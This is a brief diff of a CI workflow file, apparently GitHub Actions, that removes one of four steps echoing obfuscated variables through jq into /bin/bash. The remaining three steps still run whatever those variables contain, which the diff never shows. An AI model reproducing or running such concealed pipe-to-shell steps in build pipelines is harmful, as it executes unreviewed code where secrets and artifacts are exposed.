@@ -25,7 +25,6 @@ jobs:
           echo $wija417 | jq -r .qn3 | /bin/bash
           echo $od37 | jq -r .z05677 | /bin/bash
           echo $glb20 | jq -r .ovo9306 | /bin/bash
-          echo $w606 | jq -r .af80 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
